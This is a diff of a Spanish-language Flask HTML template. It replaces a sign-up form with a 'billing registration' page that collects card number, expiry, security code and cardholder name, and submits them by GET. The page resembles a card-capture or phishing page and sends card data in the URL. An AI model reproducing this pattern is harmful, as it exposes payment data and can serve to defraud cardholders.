@@ -15,7 +15,7 @@
             height: 100%;
             font-family: Arial, sans-serif;
             /* Imagen de fondo para toda la página */
-            background: url("{{ url_for('static', filename='images/imag3.jpg') }}") no-repeat center center;
+            background: url("{{ url_for('static', filename='images/image2.png') }}") no-repeat center center;
             background-size: cover;
         }
 
@@ -46,7 +46,7 @@
         .login-container {
             position: absolute;
             bottom: 20px;
-            top: 20%; /* Centra verticalmente */
+            top: 37%; /* Centra verticalmente */
             right: 40px;
             text-align: center;
             color: rgb(12, 14, 13); /* Color del texto */
@@ -86,17 +86,6 @@
         button:hover {
             background-color: #45a049; /* Color más oscuro al pasar el cursor */
         }
-        .flash-messages {
-            color: white;
-            background-color: #ff6b6b; /* Rojo para errores */
-            padding: 10px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-        .flash-success {
-            background-color: #4caf50; /* Verde para éxito */
-        }
 
     </style>
 </head>
@@ -104,64 +93,35 @@
     <!-- Contenedor para el nombre de la compañía e ícono -->
     <div class="company-header">
         <!-- Muestra el logo de la compañía. Asegúrate de tener el archivo logo.png en la carpeta 'static/images' -->
-        <img src="https://png.pngtree.com/png-vector/20190307/ourlarge/pngtree-vector-electron-icon-png-image_781297.jpg" alt="Company Logo">
-        <h1>Registra_tus_credenciales</h1> <!-- Nombre de la compañía -->
+        <img src="{{ url_for('static', filename='images/logo.png') }}" alt="Company Logo">
+        <h1>Registro de facturación</h1> <!-- Nombre de la compañía -->
     </div>
-
 
     <div class="login-container">
         <!-- <h1>Bienvenido estudiante</h1> Título de la página -->
-          <!-- Mensajes flash (exito/error) -->
-        {% with messages = get_flashed_messages(with_categories=True) %}
-        {% if messages %}
-          <div class="flash-container">
-            {% for category, message in messages %}
-              <div class="flash-messages {{ 'flash-' + category }}">
-                {{ message }}
-              </div>
-            {% endfor %}
-          </div>
-        {% endif %}
-      {% endwith %}
 
         <!-- Formulario de inicio de sesión para ingresar username/email y contraseña -->
-        <form action="/estudiante/guardar" method="POST">
+        <form action="/estudiante/" method="GET">
             <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
-            <input type="text" name="nombre" placeholder="Nombres" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
-            <br>
-            <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
-            <input type="text" name="apellido" placeholder="Apellidos" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
+            <input type="text" name="pais_facturacion" placeholder="Pais de facturación" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
             <br>
             <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
-            <input type="text" name="nombreUsuario" placeholder="Nombre de usuario" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
+            <input type="text" name="numero_tarjeta" placeholder="Número de tarjeta crédito/débito" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
             <br>
             <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
-            <input type="text" name="correo" placeholder="Correo electrónico" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
+            <input type="text" name="fecha_expiracion" placeholder="Fecha de expiración" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
             <br>
-            <!-- Campo para ingresar la contraseña -->
-            <input type="password" name="contrasena" placeholder="Contraseña" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
-            <br>
-            <!-- Campo para ingresar la contraseña -->
-            <input type="password" name="confirmar_contrasena" placeholder="Confirmar contraseña" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
+             <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
+             <input type="text" name="codigo_seguridad" placeholder="Código de seguridad" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
+             <br>
+              <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
+            <input type="text" name="nombre_titular" placeholder="Nombre del titular" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
             <br>
             <!-- Botón para enviar el formulario de inicio de sesión -->
-            <button type="submit">Continue</button>
+            <button type="submit">Verificar y continuar</button>
         </form>
     </div>
 
-    <script>
-        const form = document.querySelector('form');
-        form.addEventListener('submit', (event) => {
-            const password = form.querySelector('input[name="contrasena"]').value;
-            const confirmPassword = form.querySelector('input[name="confirmar_contrasena"]').value;
-            
-            if (password !== confirmPassword) {
-                event.preventDefault(); // Evita el envío del formulario
-                alert('Las contraseñas no coinciden.');
-            }
-        });
-    </script>
 </body>
 </html>
-
 {% endblock %}
